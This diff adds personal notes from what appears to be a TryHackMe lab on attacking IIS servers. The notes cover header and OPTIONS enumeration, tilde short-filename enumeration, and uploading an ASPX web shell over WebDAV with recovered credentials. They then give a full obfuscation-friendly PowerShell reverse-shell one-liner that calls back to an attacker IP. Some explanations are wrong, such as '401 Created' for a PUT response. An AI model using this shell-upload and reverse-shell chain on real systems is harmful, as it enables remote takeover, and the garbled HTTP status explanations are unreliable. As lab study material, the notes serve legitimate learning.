@@ -1,0 +1,67 @@
+TARGET_IP = 10.113.183.213
+
+IIS
+ - Internet Information Services
+ - Microsoft's web server platform built into Windows Server
+ - hosts websites and web apps, is on almost every Windows Server
+ - exploited by Lazarus, still has unpatched CVEs that are actively exploited
+ - IIS/6.0 = Windows Server 2003, EOL, CVE-2017-7269
+ - IIS 7.0 / 7.5, IIS 8.0 / 8.5 are also EOL (End of Life)
+ - IIS 10.0 = Windows Server 2016, 2019, 2022, current
+ - IIS Architecture (tryhackme.com) - https://cdn-images.tryhackme.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1778090380771.png
+ 
+ - check headers for X-Powered-By: something.NET (curl -SI http://10.113.183.213)
+ - HTTP OPTIONS method to get supported methods
+ - curl -X OPTIONS http://10.113.183.213 -sv 2>&1 | grep -E "Allow:|DAV:"
+ 
+ - this next one looks devious but the thought is pretty simple
+ - PUT a test file, then GET it to see the response
+ - if you get 200 with the file contents, then it was served statically 
+ - a 401 Created on PUT means no write access
+ - a 401 on GET with rendered output confirms execution
+ - curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://10.113.183.213/webdav/test.aspx
+
+IIS Short Filename (Tilde) enumeration
+ - Windows Server defaultly has short filename (8.3) (inherited from DOS)
+ - 8 characters for name, 3 for extension
+ - a path that matches a real file has a different HTTP status code or response size than a non-match
+ - this really helps attackers' directory enumeration and hidden files
+ - affects IIS 5.x through IIS 10.0, including current versions on Server 2022. Microsoft has declined to patch it
+ - we used iis_shortname_scan.py
+
+WebDAV exploitation (uploading ASPX shell)
+ - WebDAV = Web Distributed Authoring and Versioning
+ - we got the credentials from tilde enumeration (webdav_user:P@ssw0rd!123)
+ - we prepared an aspx shell (cmd.aspx)
+ - used curl with ntlm auth to PUT the file direct in the webdav directory
+ - curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://10.113.183.213/webdav/cmd.aspx
+ - confirm it works
+ - curl "http://10.113.183.213/webdav/cmd.aspx?cmd=whoami"
+ - try some other commands
+ - curl "http://10.113.183.213/webdav/cmd.aspx?cmd=dir+C:\\"
+ 
+ - now to a revshell
+ - nc -lvnp 443
+ - curl -G "http://10.113.183.213/webdav/cmd.aspx" \
+ - --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient('"'"'10.113.121.124'"'"',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '"'"'PS '"'"' + (pwd).Path + '"'"'> '"'"';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
+ - the shell works
+
+next we went through some common misconfigurations
+I won't include them in full, you can read this (https://medium.com/@phrabia7/web-server-attacks-ii-tryhackme-part-2-4acae678c610?postPublishedType=repub)
+ - Directory Listing Enabled
+ - HTTP PUT and DELETE Without Authentication
+ - web.config Exposure
+ - Verbose Error Messages
+ - trace.axd Left Enabled
+ - TRACE Method Enabled
+ - Application Pool Running as a Privileged Account
+
+Automation
+ - we will be using nmap scripts, first we need -sV
+ - nmap -sV -p 80 10.113.183.213
+ - automating the OPTIONS request we did:
+ - nmap --script http-methods -p 80 10.113.183.213
+ - detecting WebDAV with nmap:
+ - nmap --script http-webdav-scan -p 80 10.113.183.213
+ - identifying Authentication requirements
+ - nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 10.113.183.213
